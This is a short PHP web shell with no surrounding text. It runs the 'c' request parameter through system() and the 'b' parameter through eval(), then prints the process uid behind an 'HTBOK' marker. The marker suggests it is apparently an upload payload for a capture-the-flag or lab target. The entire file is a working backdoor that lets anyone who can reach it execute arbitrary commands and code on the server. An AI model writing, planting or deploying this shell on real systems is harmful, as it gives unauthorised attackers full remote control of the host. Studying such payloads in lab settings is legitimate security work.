<?php
if (isset($_REQUEST['c'])) { system($_REQUEST['c']); }
elseif (isset($_REQUEST['b'])) { eval($_REQUEST['b']); }
echo "\nHTBOKuid=".posix_getuid()."\n";
